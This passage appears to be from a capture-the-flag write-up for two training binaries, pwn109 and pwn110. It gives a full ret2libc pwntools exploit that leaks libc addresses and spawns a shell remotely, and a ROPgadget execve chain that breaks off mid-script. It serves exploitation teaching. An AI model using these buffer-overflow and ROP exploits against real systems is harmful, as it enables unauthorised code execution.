$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdcd8│+0x0000: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"	 ← $rsp
0x00007fffffffdce0│+0x0008: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x00007fffffffdce8│+0x0010: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana[...]"
0x00007fffffffdcf0│+0x0018: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoa[...]"
0x00007fffffffdcf8│+0x0020: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
0x00007fffffffdd00│+0x0028: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
0x00007fffffffdd08│+0x0030: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"
0x00007fffffffdd10│+0x0038: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40122a <main+0038>      call   0x401070 <gets@plt>
     0x40122f <main+003d>      nop    
     0x401230 <main+003e>      leave  
 →   0x401231 <main+003f>      ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn109", stopped 0x401231 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401231 → main()

gef➤  patt off faaaaaaagaaaaaaahaaaaaaai
[+] Searching for '69616161616161616861616161616161676161616161616166'/'66616161616161616761616161616161686161616161616169' with period=8
[+] Found at offset 40 (big-endian search)
```

The offset is 40 which means we need to send 40 bytes of junk before we overwrite the return address.

```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn109", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code

# Useful gadgets
pop_rdi_gadget = p64(0x00000000004012a3)

offset = 40
base_buffer = b"A"*offset

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

target_funcs = {"gets": "", "setvbuf": ""}

#~~~< Exploit Code Here >~~~#
for func in target_funcs:
	# Payload to leak LIBC address
	libc_leak = base_buffer
	libc_leak += pop_rdi_gadget
	libc_leak += p64(binary.got[func])
	libc_leak += p64(binary.plt['puts'])
	libc_leak += p64(binary.sym['main'])

	p.sendline(libc_leak)
	p.recvuntil(b"Go ahead ")
	p.recvline()
	leaked_address = p.recvline()
	leaked_address = u64(leaked_address.strip().ljust(8, b"\x00"))
	target_funcs[func] = leaked_address

	info(f"Leaked '{func}' Address: {hex(leaked_address)}")

# Close connection
p.close()
```

The **ROP** chain looks like so: `'A'x40 + pop rdi ret gadget + function@GOT + puts@PLT + main()`. We call the `main()` function after each address leak so we can continue with the next leak without having to re-run the binary.

```text
$ python3 leak_funcs.py REMOTE HOST=$IP PORT=9009
[+] Opening connection to XX.XX.XX.XX on port 9009: Done
[*] Leaked 'gets' Address: 0x7f1b41e85970
[*] Leaked 'setvbuf' Address: 0x7f1b41e86ce0
[*] Closed connection to XX.XX.XX.XX port 9009
```

| Function  | Last 3 nibbles (offset) |
| --------- | ----------------------- |
| `gets()`    | **970**                     |
| `setvbuf()` | **ce0**                     |

Putting these values into [libc.rip](https://libc.rip/) it identifies multiple possible **LIBC** versions from `libc6_2.31-0ubuntu9.8_amd64` through `libc6_2.31-0ubuntu9.18_amd64`. All of these versions have the same offsets for the `system()` function and the string `/bin/sh`.

| Target   | Offset   |
| -------- | -------- |
| `gets()`   | **0x83970**  |
| `system()` | **0x52290**  |
| `/bin/sh`  | **0x1b45bd** |

With these values, we can calculate the **LIBC base address** and from there calculate the true runtime addresses of `system()` and `/bin/sh`.

```text
LIBC Base = leaked gets() address - 0x83970
system() Address = LIBC Base + 0x52290
/bin/sh Address = LIBC Base + 0x1b45bd
```

The final payload will look like so: `'A'x40 + ret gadget + pop rdi ret gadget + /bin/sh address + system() address`.

### Exploit (pwntools):
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn109", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code

# Useful gadgets
pop_rdi_gadget = p64(0x00000000004012a3)
ret_gadget = p64(0x000000000040101a)

offset = 40
base_buffer = b"A"*offset

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

target_funcs = {"gets": "", "setvbuf": ""}

#~~~< Exploit Code Here >~~~#
for func in target_funcs:
	# Payload to leak LIBC address
	libc_leak = base_buffer
	libc_leak += pop_rdi_gadget
	libc_leak += p64(binary.got[func])
	libc_leak += p64(binary.plt['puts'])
	libc_leak += p64(binary.sym['main'])

	p.sendline(libc_leak)
	p.recvuntil(b"Go ahead ")
	p.recvline()
	leaked_address = p.recvline()
	leaked_address = u64(leaked_address.strip().ljust(8, b"\x00"))
	target_funcs[func] = leaked_address

	info(f"Leaked '{func}' Address: {hex(leaked_address)}")

libc_base = target_funcs["gets"] - 0x83970
info(f"LIBC Base: {hex(libc_base)}")

system_address = libc_base + 0x52290
bin_sh_address = libc_base + 0x1b45bd
info(f"LIBC system() Address: {hex(system_address)}")
info(f"LIBC '/bin/sh' Address: {hex(bin_sh_address)}")

shell_payload = base_buffer
shell_payload += ret_gadget
shell_payload += pop_rdi_gadget
shell_payload += p64(bin_sh_address)
shell_payload += p64(system_address)

p.sendline(shell_payload)
p.interactive()

# Close connection
p.close()
```

### Remote Exploitation:
```text
$ python3 exploit.py REMOTE HOST=$IP PORT=9009
[+] Opening connection to XX.XX.XX.XX on port 9009: Done
[*] Leaked 'gets' Address: 0x7f34a92fe970
[*] Leaked 'setvbuf' Address: 0x7f34a92ffce0
[*] LIBC Base: 0x7f34a927b000
[*] LIBC system() Address: 0x7f34a92cd290
[*] LIBC '/bin/sh' Address: 0x7f34a942f5bd
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 109          

This time no 🗑️ 🤫 & 🐈🚩.📄 Go ahead 😏
$ whoami
pwn109
$ cat flag.txt
THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

---
---
## pwn110 Solution
### Disassembly:
```c
void main(void)
{
    int64_t in_stack_00000058;
    char *s;
    
    setup();
    banner();
    sym.puts("Hello pwner, I\'m the last challenge 😼", in_stack_00000058);
    sym.puts("Well done, Now try to pwn me without libc 😏", in_stack_00000058);
    sym.gets((char *)&s, in_stack_00000058);
    return;
}
```

#### Disassembly (Assembly):
```
0000000000401e61 <main>:
  401e61:   f3 0f 1e fa             endbr64
  401e65:   55                      push   %rbp
  401e66:   48 89 e5                mov    %rsp,%rbp
  401e69:   48 83 ec 20             sub    $0x20,%rsp
  401e6d:   b8 00 00 00 00          mov    $0x0,%eax
  401e72:   e8 6e ff ff ff          call   401de5 <setup>
  401e77:   b8 00 00 00 00          mov    $0x0,%eax
  401e7c:   e8 c9 ff ff ff          call   401e4a <banner>
  401e81:   48 8d 3d 98 32 09 00    lea    0x93298(%rip),%rdi        # 495120 <_IO_stdin_used+0x120>
  401e88:   e8 43 fd 00 00          call   411bd0 <_IO_puts>
  401e8d:   48 8d 3d bc 32 09 00    lea    0x932bc(%rip),%rdi        # 495150 <_IO_stdin_used+0x150>
  401e94:   e8 37 fd 00 00          call   411bd0 <_IO_puts>
  401e99:   48 8d 45 e0             lea    -0x20(%rbp),%rax
  401e9d:   48 89 c7                mov    %rax,%rdi
  401ea0:   b8 00 00 00 00          mov    $0x0,%eax
  401ea5:   e8 66 fb 00 00          call   411a10 <_IO_gets>
  401eaa:   90                      nop
  401eab:   c9                      leave
  401eac:   c3                      ret
  401ead:   0f 1f 00                nopl   (%rax)
```

This binary is statically compiled, so when disassembling the binary there are hundreds of functions, many of which are not actually used during the standard execution of the binary. However, we can see that the `main()` function outputs a couple of lines prompting the user to exploit the binary without using **LIBC**, after that it calls the `gets()` function to read user input from **stdin** and writes it into a pre-defined buffer. The `gets()` function has no bounds checking when writing into a buffer, which can lead to a buffer overflow.

The assembly disassembly of the `main()` function shows that the buffer is `0x20` (`32`) bytes large (`sub $0x20,%rsp`).

### Binary Protections (checksec):
```bash
$ checksec ./pwn110
[*] './pwn110'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This binary is compiled with **Partial RELRO** which means we could possibly overwrite a **GOT entry**, although that is not particularly useful in this binary as the `main()` function immediately returns after reading user input, rather than calling another function such as `puts()`.

It is compiled with stack protections in place, a stack canary and the **NX** (**Non Executable**) bit is set which means that exploiting a buffer overflow is slightly more difficult without a canary leak and we cannot just drop shellcode onto the stack and return to it. Although, the disassembly of the `main()` function shows that there is no stack canary in place interestingly.

Finally, the binary is *not* compiled with **PIE** (**Position Independant Executable**) which means that the addresses of functions and gadgets will stay the same every time the binary is run.

### Exploitation:
When a binary is statically compiled, it usually contains hundreds, if not thousands, of **gadgets**. Though many of them are not so useful during exploitation. I have 5 different exploits for this binary, although there are most definitely quite a few more.

The tool [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) has a useful argument `--ropchain` which will attempt to locate the necessary gadgets and build a full **ROP chain** that can be used to exploit the binary and spawn a shell.

#### Finding the offset:
Before building any **ROP chain**, we need to find the offset at which be overwrite the saved return address.

```text
gef➤  patt cr 200
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: ./pwn110 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110          

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401eac in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdcb0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x0000000000400518  →  0x0000000000000000
$rcx   : 0x00000000004c0500  →  0x00000000fbad208b
$rdx   : 0x0               
$rsp   : 0x00007fffffffdcd8  →  "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00000000004c0583  →  0x4c2c80000000000a ("\n"?)
$rdi   : 0x00000000004c2c80  →  0x0000000000000000
$rip   : 0x0000000000401eac  →  <main+004b> ret 
$r8    : 0x00007fffffffdcb0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$r9    : 0x0               
$r10   : 0x2f40            
$r11   : 0x246             
$r12   : 0x0000000000402f30  →  <__libc_csu_fini+0000> endbr64 
$r13   : 0x0               
$r14   : 0x00000000004c0018  →  0x000000000043f7e0  →  <__strcpy_avx2+0000> endbr64 
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdcd8│+0x0000: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"	 ← $rsp
0x00007fffffffdce0│+0x0008: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x00007fffffffdce8│+0x0010: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana[...]"
0x00007fffffffdcf0│+0x0018: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoa[...]"
0x00007fffffffdcf8│+0x0020: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
0x00007fffffffdd00│+0x0028: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
0x00007fffffffdd08│+0x0030: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"
0x00007fffffffdd10│+0x0038: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401ea5 <main+0044>      call   0x411a10 <gets>
     0x401eaa <main+0049>      nop    
     0x401eab <main+004a>      leave  
 →   0x401eac <main+004b>      ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn110", stopped 0x401eac in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401eac → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  patt off faaaaaaagaaaaaaahaaa
[+] Searching for '6161616861616161616161676161616161616166'/'6661616161616161676161616161616168616161' with period=8
[+] Found at offset 40 (big-endian search)
```

The offset is **40** which means we need to send 40 bytes of junk before we overwrite the saved return address and continue the **ROP chain**.

#### Exploit 1 (ROPgadget ROP Chain):
```bash
$ ROPgadget --binary ./pwn110 --ropchain --silent

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x47bcf5 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x40f4de pop rsi ; ret
	[+] Gadget found: 0x4497d7 pop rax ; ret
	[+] Gadget found: 0x443e30 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x443e30 xor rax, rax ; ret
	[+] Gadget found: 0x470d20 add rax, 1 ; ret
	[+] Gadget found: 0x470d21 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x40191a pop rdi ; ret
	[+] Gadget found: 0x40f4de pop rsi ; ret
	[+] Gadget found: 0x40181f pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x4012d3 syscall

- Step 5 -- Build the ROP chain

#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall
```

##### ROP Chain Explanation:
```bash
pop rsi ; ret
@ .data                         # Writes the address of the .data section into RSI

pop rax ; ret
b'/bin//sh'                     # Writes the string "/bin//sh" (8 bytes) into RAX 
mov qword ptr [rsi], rax ; ret  # Writes the string "/bin//sh" (RAX) into the .data section (RSI)

pop rsi ; ret
@ .data + 8                     # Writes the address of the .data section plus 8 bytes into RSI
xor rax, rax ; ret              # XORs RAX against itself resulting in RAX being 0x0
mov qword ptr [rsi], rax ; ret  # Writes 0x0 (RAX) at .data+0x8 (RSI)

pop rdi ; ret
@ .data                         # Writes the address of "/bin//sh" in .data into RDI

pop rsi ; ret
@ .data + 8                     # Writes the address of 0x0 in .data into RSI

pop rdx ; ret
@ .data + 8                     # Writes the address of 0x0 in .data into RDX

xor rax, rax ; ret              # XORs RAX against itself resulting in RAX being 0x0
add rax, 1 ; ret                # Adds 0x1 to RAX (RAX = 1)
add rax, 1 ; ret                # RAX = 2
add rax, 1 ; ret                # RAX = 3
add rax, 1 ; ret                # RAX = 4
add rax, 1 ; ret                # RAX = 5
add rax, 1 ; ret                # RAX = 6
add rax, 1 ; ret                # RAX = 7
add rax, 1 ; ret                # RAX = 8
add rax, 1 ; ret                # RAX = 9
add rax, 1 ; ret                # RAX = 10
add rax, 1 ; ret                # RAX = 11
add rax, 1 ; ret                # RAX = 12
add rax, 1 ; ret                # RAX = 13
add rax, 1 ; ret                # RAX = 14
add rax, 1 ; ret                # RAX = 15
add rax, 1 ; ret                # RAX = 16
add rax, 1 ; ret                # RAX = 17
add rax, 1 ; ret                # RAX = 18
add rax, 1 ; ret                # RAX = 19
add rax, 1 ; ret                # RAX = 20
add rax, 1 ; ret                # RAX = 21
add rax, 1 ; ret                # RAX = 22
add rax, 1 ; ret                # RAX = 23
add rax, 1 ; ret                # RAX = 24
add rax, 1 ; ret                # RAX = 25
add rax, 1 ; ret                # RAX = 26
add rax, 1 ; ret                # RAX = 27
add rax, 1 ; ret                # RAX = 28
add rax, 1 ; ret                # RAX = 29
add rax, 1 ; ret                # RAX = 30
add rax, 1 ; ret                # RAX = 31
add rax, 1 ; ret                # RAX = 32
add rax, 1 ; ret                # RAX = 33
add rax, 1 ; ret                # RAX = 34
add rax, 1 ; ret                # RAX = 35
add rax, 1 ; ret                # RAX = 36
add rax, 1 ; ret                # RAX = 37
add rax, 1 ; ret                # RAX = 38
add rax, 1 ; ret                # RAX = 39
add rax, 1 ; ret                # RAX = 40
add rax, 1 ; ret                # RAX = 41
add rax, 1 ; ret                # RAX = 42
add rax, 1 ; ret                # RAX = 43
add rax, 1 ; ret                # RAX = 44
add rax, 1 ; ret                # RAX = 45
add rax, 1 ; ret                # RAX = 46
add rax, 1 ; ret                # RAX = 47
add rax, 1 ; ret                # RAX = 48
add rax, 1 ; ret                # RAX = 49
add rax, 1 ; ret                # RAX = 50
add rax, 1 ; ret                # RAX = 51
add rax, 1 ; ret                # RAX = 52
add rax, 1 ; ret                # RAX = 53
add rax, 1 ; ret                # RAX = 54
add rax, 1 ; ret                # RAX = 55
add rax, 1 ; ret                # RAX = 56
add rax, 1 ; ret                # RAX = 57
add rax, 1 ; ret                # RAX = 58
add rax, 1 ; ret                # RAX = 59

# RAX = 59  (syscall number for execve)
# RDX = *0x0
# RSI = *0x0
# RDI = *"/bin//sh"

syscall                         # Executes the execve syscall
```

Implementing this **ROP chain** into a **pwntools** script, we get the resulting script.

```python
#!/usr/bin/env python3

from pwn import *
from struct import pack

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn110", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
buffer = b'A'*40

buffer += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
buffer += pack('<Q', 0x00000000004c00e0) # @ .data
buffer += pack('<Q', 0x00000000004497d7) # pop rax ; ret
buffer += b'/bin//sh'
buffer += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
buffer += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
buffer += pack('<Q', 0x00000000004c00e8) # @ .data + 8
buffer += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
buffer += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
buffer += pack('<Q', 0x000000000040191a) # pop rdi ; ret
buffer += pack('<Q', 0x00000000004c00e0) # @ .data
buffer += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
buffer += pack('<Q', 0x00000000004c00e8) # @ .data + 8
buffer += pack('<Q', 0x000000000040181f) # pop rdx ; ret
buffer += pack('<Q', 0x00000000004c00e8) # @ .data + 8
buffer += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
